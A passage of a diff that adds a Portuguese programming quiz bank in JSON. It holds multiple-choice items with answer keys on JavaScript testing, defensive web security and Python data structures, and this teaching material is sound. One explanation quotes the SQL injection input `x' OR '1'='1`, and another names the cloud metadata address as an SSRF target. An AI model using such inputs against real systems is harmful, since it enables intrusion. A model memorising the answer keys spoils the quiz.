+      "Os dois falham, porque contador começa como undefined"
+    ],
+    "answer": 2,
+    "explanation": "Variáveis fora dos testes são compartilhadas. Um teste que depende da ordem, ou do que outro deixou para trás, é frágil e difícil de diagnosticar. Cada teste deve montar o próprio cenário (por exemplo, num `beforeEach`).",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-008",
+    "language": "javascript",
+    "question": "O que esse teste verifica?",
+    "code": "const enviar = mock.fn();\n\nregistrar(\"ana@exemplo.com\", enviar);\n\nassert.strictEqual(enviar.mock.callCount(), 1);",
+    "options": [
+      "Que o e-mail de ana@exemplo.com chegou na caixa de entrada",
+      "Que registrar chamou o envio uma vez, sem e-mail de verdade",
+      "Que registrar devolve o número 1 quando o envio dá certo",
+      "Que a função enviar foi escrita sem nenhum erro de sintaxe"
+    ],
+    "answer": 1,
+    "explanation": "`mock.fn()` cria uma função falsa que grava como foi chamada (quantas vezes, com quais argumentos). Assim o teste isola `registrar` da dependência real (rede, e-mail), fica rápido e sem efeito colateral, e ainda confere a interação.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-009",
+    "language": "javascript",
+    "question": "Qual é o problema desse teste?",
+    "code": "test(\"divisão por zero\", () => {\n  try {\n    dividir(1, 0);\n  } catch (e) {\n    assert.match(e.message, /zero/);\n  }\n});",
+    "options": [
+      "O assert.match só aceita textos e não funciona com e.message",
+      "Passa mesmo que dividir nunca lance erro; use assert.throws",
+      "assert.match foi removido, por isso o teste sempre falha",
+      "Falta um bloco finally para o teste conseguir terminar de rodar"
+    ],
+    "answer": 1,
+    "explanation": "Se `dividir` não lançar nada (em JavaScript, `1 / 0` dá `Infinity`), o `catch` não roda, nenhuma verificação acontece e o teste passa. `assert.throws(() => dividir(1, 0), /zero/)` falha nesse caso, que é o que se quer.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-010",
+    "language": "javascript",
+    "question": "Por que esse teste é instável (flaky), e como corrigir?",
+    "code": "test(\"saudação\", () => {\n  assert.strictEqual(saudar(), \"Bom dia\");\n});\n// saudar() olha new Date().getHours()",
+    "options": [
+      "Depende da hora em que roda; congele o relógio com mock.timers",
+      "Depende da memória livre; rode-o em um processo separado",
+      "Depende da rede; troque o assert por um que espere mais",
+      "Depende da ordem em que os outros testes rodam; rode um por vez"
+    ],
+    "answer": 0,
+    "explanation": "Um teste que ora passa, ora falha sem o código mudar é instável. Aqui o resultado muda com a hora real. `t.mock.timers.enable({ apis: [\"Date\"], now })` fixa o `Date`, e o teste passa a dar sempre o mesmo resultado.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-011",
+    "language": "javascript",
+    "question": "Qual é a ordem do ciclo do TDD?",
+    "code": "",
+    "options": [
+      "Escrever um teste que falha, fazer passar, refatorar",
+      "Refatorar, escrever o teste e só então escrever o código",
+      "Fazer passar, escrever o teste que falha e depois refatorar",
+      "Escrever o código, depois o teste, depois a documentação"
+    ],
+    "answer": 0,
+    "explanation": "Red (o teste falha, provando que ele realmente testa algo), Green (o código mínimo para passar) e Refactor (melhorar o código com a rede de proteção dos testes). O teste vem antes do código.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-012",
+    "language": "javascript",
+    "question": "O relatório mostra 100% de cobertura. O que isso garante?",
+    "code": "// calc.js tem soma() e dobro()\ntest(\"roda tudo\", () => {\n  soma(1, 2);\n  dobro(4);\n});",
+    "options": [
+      "Que cada função devolve o valor correto para qualquer entrada",
+      "Que o código está livre de defeitos conhecidos e desconhecidos",
+      "Que os testes cobrem todos os casos de borda que podem existir",
+      "Que as linhas rodaram, não que os resultados foram conferidos"
+    ],
+    "answer": 3,
+    "explanation": "Cobertura mede quais linhas foram executadas, não se os resultados foram verificados. O teste acima executa tudo e não tem nenhum `assert`: 100% de cobertura e nenhuma garantia. Ela mostra bem o que NÃO foi testado, mas não a qualidade.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-013",
+    "language": "javascript",
+    "question": "Por que usar `t.mock` em vez do `mock` global?",
+    "code": "test(\"A\", () => {\n  mock.method(Math, \"random\", () => 0.5);\n});\n\ntest(\"B\", () => {\n  // usa o Math.random() de verdade...\n});",
+    "options": [
+      "O t.mock aceita funções assíncronas; o global só aceita síncronas",
+      "O t.mock é a única forma de contar quantas vezes foi chamado",
+      "O t.mock é desfeito sozinho no fim do teste; o global pode vazar",
+      "O mock global não funciona em métodos de objetos nativos"
+    ],
+    "answer": 2,
+    "explanation": "O mock do contexto (`t.mock`) é desfeito automaticamente quando o teste termina. O `mock` global continua ativo até um `mock.restoreAll()` e pode alterar testes seguintes (aqui o `Math.random` do B continuaria falso), causando falhas à distância.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-014",
+    "language": "javascript",
+    "question": "Na pirâmide de testes, por que há mais testes unitários que de ponta a ponta (E2E)?",
+    "code": "",
+    "options": [
+      "Os testes E2E não conseguem cobrir nenhuma parte do código da aplicação",
+      "Os E2E são proibidos em projetos com integração contínua",
+      "Unitários são rápidos e apontam o defeito; E2E são lentos e frágeis",
+      "Os unitários testam o sistema inteiro de ponta a ponta, então bastam"
+    ],
+    "answer": 2,
+    "explanation": "Quanto mais alto na pirâmide, mais o teste envolve (navegador, rede, banco) e mais lento, caro e sujeito a falhas intermitentes fica. Muitos unitários na base dão feedback em segundos e localizam o erro; poucos E2E no topo garantem os fluxos críticos.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-015",
+    "language": "javascript",
+    "question": "Quantos testes o relatório mostra, e qual a vantagem?",
+    "code": "const casos = [\n  [1, 2, 3],\n  [2, 2, 4],\n  [0, 5, 5],\n];\n\nfor (const [a, b, esperado] of casos) {\n  test(`soma ${a}+${b}`, () => assert.strictEqual(soma(a, b), esperado));\n}",
+    "options": [
+      "3, mas todos falham se um único caso estiver errado",
+      "0, porque test() não pode ser chamado dentro de um laço",
+      "3, um por caso; um caso novo é só mais uma linha",
+      "1 só, que para no primeiro caso que falhar e esconde os outros"
+    ],
+    "answer": 2,
+    "explanation": "Cada volta do laço registra um teste, então cada caso aparece (e falha) separadamente, com o nome mostrando os valores. Esse padrão, de testes em tabela, evita copiar e colar e deixa óbvio quais entradas estão cobertas.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-016",
+    "language": "javascript",
+    "question": "Se trocarmos `a + b` por `a - b`, o que acontece com esse teste, e o que isso revela?",
+    "code": "function soma(a, b) {\n  return a + b;\n}\n\ntest(\"soma devolve um número\", () => {\n  assert.strictEqual(typeof soma(2, 3), \"number\");\n});",
+    "options": [
+      "Passa a falhar, mas só porque o Node reclama do operador",
+      "Continua passando: é um teste fraco, que não confere o resultado",
+      "Continua passando, o que prova que a soma está correta e completa",
+      "Passa a falhar, o que prova que ele é um bom teste de verdade"
+    ],
+    "answer": 1,
+    "explanation": "O teste só confere o tipo do retorno, então passa com a soma certa e com o código sabotado. Essa é a ideia dos testes de mutação: alterar o código de propósito e ver se algum teste percebe. Um teste forte confere o valor: `soma(2, 3) === 5`.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "sec-001",
+    "language": "javascript",
+    "question": "O que é XSS (cross-site scripting)?",
+    "code": "comentario.innerHTML = textoDigitadoPorOutraPessoa;",
+    "options": [
+      "Interceptar o tráfego de uma rede Wi-Fi que não usa criptografia",
+      "Injetar um script malicioso na página que outras pessoas abrem",
+      "Derrubar um site enviando milhões de acessos ao mesmo tempo",
+      "Descobrir uma senha testando combinações até acertar a certa"
+    ],
+    "answer": 1,
+    "explanation": "No XSS o atacante faz o site entregar um script dele aos outros visitantes (por exemplo, num comentário mostrado com `innerHTML`). O script roda com as permissões do site e pode ler dados da página e agir em nome da pessoa.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-002",
+    "language": "http",
+    "question": "O que o HTTPS acrescenta ao HTTP?",
+    "code": "https://www.exemplo.com.br/",
+    "options": [
+      "Um servidor mais rápido, porque a conexão fica comprimida",
+      "Anonimato total: ninguém descobre qual site você visitou",
+      "Criptografia da conversa e prova de quem é o site",
+      "Proteção contra falhas no código da aplicação do site"
+    ],
+    "answer": 2,
+    "explanation": "O HTTPS é o HTTP dentro de uma conexão TLS: o conteúdo viaja criptografado (ninguém no caminho lê ou altera) e o certificado confirma a identidade do site. Ele não corrige falhas do código do site nem esconde o domínio visitado.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-003",
+    "language": "javascript",
+    "question": "Como guardar a senha de uma pessoa no banco de dados?",
+    "code": "",
+    "options": [
+      "Em Base64, que deixa o texto ilegível para quem for curioso",
+      "Só o hash com sal, gerado por bcrypt, scrypt ou argon2",
+      "Em texto puro, mas com o banco protegido por firewall",
+      "Criptografada com AES, para poder recuperá-la depois"
+    ],
+    "answer": 1,
+    "explanation": "Guarde apenas um hash lento e com sal (bcrypt, scrypt, argon2): ele não pode ser revertido, e o login compara o hash da senha digitada. Criptografia (AES) pode ser desfeita por quem roubar a chave, e Base64 é só uma codificação, qualquer um desfaz.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-004",
+    "language": "javascript",
+    "question": "Qual o risco de montar a consulta assim?",
+    "code": "db.exec(`SELECT * FROM usuarios WHERE nome = '${nome}'`);",
+    "options": [
+      "O servidor pode ficar sem memória com nomes muito grandes",
+      "Nenhum, se o nome vier de um formulário do próprio site",
+      "SQL injection: quem controla o nome altera a consulta",
+      "A consulta fica mais lenta, pois o banco não usa índices"
+    ],
+    "answer": 2,
+    "explanation": "O texto digitado é colado dentro do SQL, então `x' OR '1'='1` vira parte do comando e devolve todos os usuários. Qualquer dado vindo do usuário pode ser malicioso, mesmo que tenha passado por um formulário seu.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-005",
+    "language": "javascript",
+    "question": "Qual é a defesa correta contra SQL injection?",
+    "code": "db.exec(`SELECT * FROM usuarios WHERE nome = '${nome}'`);",
+    "options": [
+      "Consultas parametrizadas, que separam o código SQL dos dados",
+      "Trocar as aspas simples por duplas dentro do valor digitado",
+      "Esconder as mensagens de erro do banco da pessoa",
+      "Validar o campo apenas no front-end, com JavaScript do navegador"
+    ],
+    "answer": 0,
+    "explanation": "Com `db.prepare('... WHERE nome = ?').all(nome)`, o banco recebe o SQL e os valores separadamente: o texto digitado nunca é interpretado como comando. Validação no front-end é contornável, e esconder erros só dificulta a exploração.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-006",
+    "language": "http",
+    "question": "O que esse cabeçalho faz?",
+    "code": "Content-Security-Policy: script-src 'self'",
+    "options": [
+      "Obriga o navegador a usar HTTPS em todas as requisições do site",
+      "Criptografa os scripts do site para que ninguém consiga lê-los",
+      "Só roda scripts do próprio site; inline injetado é bloqueado",
+      "Impede que o site carregue imagens e fontes de outros domínios"
+    ],
+    "answer": 2,
+    "explanation": "A CSP (Content-Security-Policy) diz ao navegador de onde pode vir cada tipo de conteúdo. Com `script-src 'self'`, só rodam scripts de arquivos do próprio site: um `<script>` ou `onerror=` injetado é bloqueado. É uma segunda barreira contra XSS.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-007",
+    "language": "http",
+    "question": "O que o atributo HttpOnly faz?",
+    "code": "Set-Cookie: sessao=abc123; HttpOnly; Secure; SameSite=Lax",
+    "options": [
+      "Faz o cookie ser enviado ao servidor só quando a conexão usa HTTPS",
+      "Apaga o cookie automaticamente assim que a aba do navegador é fechada",
+      "Impede o cookie de ser enviado em requisições vindas de outros sites",
+      "O JavaScript não lê o cookie, mas ele continua indo ao servidor"
+    ],
+    "answer": 3,
+    "explanation": "`HttpOnly` esconde o cookie de `document.cookie`, então um XSS não consegue roubar o token de sessão (o navegador ainda o envia nas requisições). Quem exige HTTPS é o `Secure`, e quem limita o envio entre sites é o `SameSite`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-008",
+    "language": "javascript",
+    "question": "Qual a diferença entre hash e criptografia?",
+    "code": "",
+    "options": [
+      "Hash é de mão única; a criptografia pode ser desfeita com a chave",
+      "Hash usa uma chave secreta; a criptografia nunca usa nenhuma chave",
+      "Os dois são desfeitos com a chave, mas o hash é bem mais lento",
+      "Hash serve para arquivos; criptografia só serve para textos"
+    ],
+    "answer": 0,
+    "explanation": "O hash (SHA-256, por exemplo) transforma qualquer dado num resumo fixo e não tem volta: serve para verificar integridade e guardar senhas. A criptografia (AES) usa uma chave para embaralhar e, com a chave, desembaralhar.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-009",
+    "language": "http",
+    "question": "Um site malicioso faz o navegador de quem está logado no seu banco enviar um POST de transferência. Que ataque é esse, e qual defesa ajuda?",
+    "code": "",
+    "options": [
+      "SQL injection; usar consultas parametrizadas em todo o acesso ao banco",
+      "XSS; escapar o HTML mostrado nas páginas e usar uma CSP restritiva",
+      "Clickjacking; enviar o cabeçalho X-Frame-Options nas respostas",
+      "CSRF; cookie de sessão com SameSite e um token anti-CSRF no formulário"
+    ],
+    "answer": 3,
+    "explanation": "No CSRF, o navegador anexa o cookie de sessão a qualquer requisição para o seu site, inclusive as disparadas por outro site. `SameSite=Lax`/`Strict` impede o envio do cookie nesses casos, e um token anti-CSRF (que o atacante não consegue adivinhar) confirma que o formulário veio da sua página.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-010",
+    "language": "javascript",
+    "question": "Um JWT assinado com HS256 tem o payload {\"id\": 7, \"admin\": false}. Quem tem o token consegue ler esse conteúdo?",
+    "code": "",
+    "options": [
+      "Não: o token vem comprimido, e só o servidor sabe descomprimir",
+      "Sim: o payload é só Base64; a assinatura não impede a leitura",
+      "Só consegue ler quem conhecer o algoritmo e a chave HS256 usados",
+      "Não: o JWT é sempre criptografado com a chave secreta do servidor"
+    ],
+    "answer": 1,
+    "explanation": "Um JWT comum (JWS) tem três partes em Base64URL: cabeçalho, payload e assinatura. Qualquer pessoa decodifica o payload; a assinatura só garante que ele não foi alterado. Por isso não ponha segredos no payload (ou use JWE, que criptografa).",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-011",
+    "language": "javascript",
+    "question": "Qual destes é adequado para gerar o token de redefinição de senha?",
+    "code": "",
+    "options": [
+      "Date.now() convertido para texto em base 36",
+      "O id do usuário somado a um número pequeno",
+      "crypto.randomBytes(32).toString('hex')",
+      "Math.random().toString(36).slice(2)"
+    ],
+    "answer": 2,
+    "explanation": "Tokens de segurança precisam ser imprevisíveis, então devem vir de um gerador criptograficamente seguro (`crypto.randomBytes`, `crypto.randomUUID`). `Math.random()` não é feito para isso, e a hora ou o id são fáceis de adivinhar.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-012",
+    "language": "javascript",
+    "question": "Para que serve o sal (salt) ao gerar o hash de senhas?",
+    "code": "",
+    "options": [
+      "Faz a mesma senha gerar hashes diferentes por pessoa",
+      "Criptografa o hash com a chave secreta do servidor",
+      "Permite recuperar a senha original quando ela é esquecida",
+      "Deixa o hash mais curto e mais rápido de comparar no login"
+    ],
+    "answer": 0,
+    "explanation": "O sal é um valor aleatório, único por usuário, misturado à senha antes do hash. Duas pessoas com a mesma senha acabam com hashes diferentes, e tabelas pré-calculadas (rainbow tables) deixam de servir. Ele não é secreto: fica ao lado do hash.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-013",
+    "language": "javascript",
+    "question": "Por que comparar um token secreto com `===` pode ser inseguro?",
+    "code": "if (tokenRecebido === tokenEsperado) {\n  liberarAcesso();\n}",
+    "options": [
+      "O === converte tipos e aceita tokens parecidos como iguais",
+      "O tempo vaza quantos caracteres batem; use timingSafeEqual",
+      "O === deixa o token no cache do navegador depois de comparar",
+      "O === só funciona com números, nunca com textos longos"
+    ],
+    "answer": 1,
+    "explanation": "A comparação com `===` para no primeiro caractere diferente, então o tempo de resposta pode vazar quantos caracteres do início estavam certos (timing attack). `crypto.timingSafeEqual` leva o mesmo tempo qualquer que seja a diferença, e exige buffers do mesmo tamanho.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-014",
+    "language": "javascript",
+    "question": "Qual o risco de o servidor baixar qualquer URL informada pela pessoa?",
+    "code": "const url = req.query.imagem; // vem do usuário\nconst resposta = await fetch(url);",
+    "options": [
+      "SSRF: pedir endereços internos (localhost, metadados) e vazar dados",
+      "XSS: a imagem baixada pode conter um script que passa a rodar no servidor",
+      "Nenhum, desde que o servidor use HTTPS ao baixar a imagem",
+      "CSRF: a URL leva o cookie de sessão do usuário para o servidor"
+    ],
+    "answer": 0,
+    "explanation": "No SSRF o servidor faz a requisição por conta do atacante, e o servidor enxerga o que o atacante não enxerga: serviços internos, `localhost` e o endereço de metadados da nuvem (169.254.169.254). Defesas: lista de domínios permitidos e bloqueio de IPs privados e de loopback após resolver o DNS.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-015",
+    "language": "http",
+    "question": "O que o navegador faz com uma resposta que traz os dois cabeçalhos abaixo, numa requisição com cookies?",
+    "code": "Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
+    "options": [
+      "Aceita, pois o curinga * vale para qualquer origem e credencial",
+      "Aceita, mas descarta os cookies e envia a requisição sem eles",
+      "Aceita apenas se a API e o site também usarem HTTPS",
+      "Rejeita: com credenciais é preciso devolver a origem exata"
+    ],
+    "answer": 3,
+    "explanation": "Com `credentials: 'include'`, o navegador não aceita `*` em `Access-Control-Allow-Origin`: a API precisa responder com a origem exata (por exemplo, `https://meusite.com`) e validar essa origem numa lista, senão qualquer site leria respostas autenticadas.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "sec-016",
+    "language": "http",
+    "question": "Qual cabeçalho impede que o seu site seja exibido dentro de um iframe de outro site (clickjacking)?",
+    "code": "",
+    "options": [
+      "Strict-Transport-Security: max-age=31536000 em todas as páginas",
+      "Access-Control-Allow-Origin definido como 'none' nas respostas",
+      "X-Content-Type-Options: nosniff nas respostas do site",
+      "X-Frame-Options: DENY (ou frame-ancestors 'none' na CSP)"
+    ],
+    "answer": 3,
+    "explanation": "No clickjacking, o atacante põe o seu site num iframe transparente sobre um botão falso, e a pessoa clica sem saber. `X-Frame-Options: DENY` (ou `Content-Security-Policy: frame-ancestors 'none'`) faz o navegador recusar o iframe.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "web-security",
+      "label": "Segurança web",
+      "description": "Ataques comuns e como se defender"
+    }
+  },
+  {
+    "id": "ds-001",
+    "language": "python",
+    "question": "O que acontece ao executar esse código?",
+    "code": "t = (1, 2, 3)\nt[0] = 9",
+    "options": [
+      "A tupla passa a ser (9, 2, 3) e o programa segue",
+      "SyntaxError: a atribuição com colchetes não existe",
+      "Nada é alterado, mas o Python não mostra nenhum erro",
+      "TypeError: a tupla não aceita atribuição de itens"
+    ],
+    "answer": 3,
+    "explanation": "Tuplas são imutáveis: depois de criadas, não dá para trocar, adicionar nem remover itens. Por isso podem ser chaves de dicionário. Se precisar mudar, use uma lista ou crie outra tupla.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-002",
+    "language": "python",
+    "question": "O que acontece ao executar esse código?",
+    "code": "preco = {\"pao\": 5, \"leite\": 7}\nprint(preco[\"ovo\"])",
+    "options": [
+      "IndexError, pois \"ovo\" não é uma posição válida",
+      "Imprime 0, o valor padrão para chaves que faltam",
+      "KeyError, pois \"ovo\" não existe; get() evita o erro",
+      "Imprime None e o programa continua normalmente, sem erro"
+    ],
+    "answer": 2,
+    "explanation": "Acessar uma chave que não existe com `[]` levanta `KeyError`. O método `preco.get(\"ovo\")` devolve `None` (ou o valor padrão que você passar: `preco.get(\"ovo\", 0)`), sem erro.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-003",
+    "language": "python",
+    "question": "O que esse código imprime?",
+    "code": "print(len(set([1, 2, 2, 3, 3, 3])))",
+    "options": [
+      "1",
+      "2",
+      "3",
+      "6"
+    ],
+    "answer": 2,
+    "explanation": "O `set` guarda cada valor uma única vez, então os repetidos somem: sobram 1, 2 e 3. É a forma mais curta de remover duplicados (mas perde a ordem original, que o conjunto não garante).",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-004",
+    "language": "python",
+    "question": "O que esse código imprime?",
+    "code": "pilha = []\npilha.append(\"a\")\npilha.append(\"b\")\npilha.append(\"c\")\nprint(pilha.pop())",
+    "options": [
+      "b",
+      "a",
+      "['a', 'b', 'c']",
+      "c"
+    ],
+    "answer": 3,
+    "explanation": "Uma pilha segue o princípio LIFO (last in, first out): o último a entrar é o primeiro a sair. Em Python, uma lista com `append` e `pop` funciona como pilha. O `pop()` sem argumento remove e devolve o último item.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-005",
+    "language": "python",
+    "question": "Qual é a forma eficiente de implementar uma fila (FIFO) em Python?",
+    "code": "from collections import deque\n\nfila = deque()\nfila.append(x)   # entra\nfila.popleft()   # sai",
+    "options": [
+      "Um set, porque ele guarda os itens na ordem de chegada",
+      "Uma lista com append e pop(0), que tem o mesmo desempenho",
+      "Um dict, usando o número de chegada como chave",
+      "collections.deque, com append e popleft"
+    ],
+    "answer": 3,
+    "explanation": "Tirar o primeiro item de uma lista (`pop(0)`) desloca todos os outros: custa O(n). A `deque` é feita para as duas pontas e faz `append`/`popleft` em O(1). Em filas grandes, a diferença é enorme.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-006",
+    "language": "python",
+    "question": "Por que `x in conjunto` é bem mais rápido que `x in lista` com milhões de itens?",
+    "code": "",
+    "options": [
+      "O set fica na memória da CPU, e a lista fica no disco",
+      "O set guarda os itens em ordem e faz busca binária",
+      "O set usa tabela hash (O(1) em média); a lista compara um a um",
+      "A lista precisa converter cada item para texto antes de comparar"
+    ],
+    "answer": 2,
+    "explanation": "O `set` calcula o hash do valor e vai direto à posição certa (tempo médio constante). A lista não tem esse atalho: percorre item por item até achar, ou até o fim. Para consultas de pertinência repetidas, converta a lista em `set`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-007",
+    "language": "python",
+    "question": "Por que esse código dá erro, e como resolver?",
+    "code": "agenda = {[1, 2]: \"reunião\"}",
+    "options": [
+      "SyntaxError: chaves de dict só podem ser textos ou números",
+      "KeyError: a chave [1, 2] ainda não foi criada no dict",
+      "TypeError: lista é mutável, não hasheável; use uma tupla",
+      "ValueError: a lista [1, 2] tem tamanho inválido para uma chave"
+    ],
+    "answer": 2,
+    "explanation": "Chaves de dicionário precisam de hash estável, e uma lista mutável poderia mudar de hash depois de inserida. Tuplas (e textos, números) são imutáveis e servem: `{(1, 2): \"reunião\"}`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-008",
+    "language": "python",
+    "question": "Dobrando o tamanho da lista, quantas vezes mais repetições o laço faz?",
+    "code": "contar = 0\nfor a in lista:\n    for b in lista:\n        contar += 1",
+    "options": [
+      "4 vezes (crescimento quadrático, O(n²))",
+      "2 vezes (crescimento linear, proporcional, O(n))",
+      "Nenhuma a mais (tempo constante, O(1))",
+      "8 vezes (crescimento cúbico, O(n³))"
+    ],
+    "answer": 0,
+    "explanation": "Para cada um dos n itens, o laço de dentro percorre outros n: são n × n repetições. Com n dobrado, vira (2n)² = 4n². É assim que se lê a complexidade: contando como o trabalho cresce com o tamanho da entrada.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-009",
+    "language": "python",
+    "question": "Numa lista ordenada de 1 milhão de itens, a busca binária faz no máximo quantas comparações?",
+    "code": "import bisect\n\ni = bisect.bisect_left(lista, alvo)",
+    "options": [
+      "Exatamente 1 milhão, uma comparação por item",
+      "Cerca de 20 (log₂ de 1 milhão)",
+      "Cerca de 500 mil (metade da lista, em média)",
+      "Cerca de 1.000 (a raiz quadrada de 1 milhão)"
+    ],
+    "answer": 1,
+    "explanation": "A cada comparação a busca binária descarta metade do que resta: 1.000.000 → 500.000 → 250.000 ... → 1. São log₂(1.000.000) ≈ 20 passos. Por isso ela precisa de lista ordenada, e por isso é tão mais rápida que olhar item por item.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-010",
+    "language": "python",
+    "question": "Quanto custa `lista.insert(0, x)` numa lista com n itens?",
+    "code": "lista.insert(0, x)",
+    "options": [
+      "O(n): todos os itens são deslocados uma posição",
+      "O(1): o Python guarda um ponteiro para o início",
+      "O(log n): o Python insere por busca binária",
+      "O(n²): cada inserção reordena a lista inteira"
+    ],
+    "answer": 0,
+    "explanation": "A lista do Python é um vetor contíguo: para abrir espaço no início, todos os n itens andam uma casa. Por isso o custo cresce com o tamanho. Se precisa inserir nas duas pontas, use `deque.appendleft`, que é O(1).",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-011",
+    "language": "python",
+    "question": "O que esse código imprime?",
+    "code": "class Ruim:\n    def __init__(self, v):\n        self.v = v\n    def __hash__(self):\n        return 1\n    def __eq__(self, o):\n        return self.v == o.v\n\nd = {Ruim(1): \"a\", Ruim(2): \"b\"}\nprint(len(d), d[Ruim(2)])",
+    "options": [
+      "TypeError: dois objetos não podem ter o mesmo hash",
+      "2 a: a busca devolve sempre o primeiro item do hash",
+      "1 b: o segundo item sobrescreve o primeiro por ter o mesmo hash",
+      "2 b: o dict resolve a colisão comparando com =="
+    ],
+    "answer": 3,
+    "explanation": "Colisão é quando chaves diferentes caem na mesma posição da tabela. O dicionário não se perde: compara com `==` e guarda os dois. Só fica mais lento, porque a busca vira quase uma varredura. É o motivo de um bom `__hash__` espalhar os valores.",
+    "difficulty": "advanced",
+    "topic": {
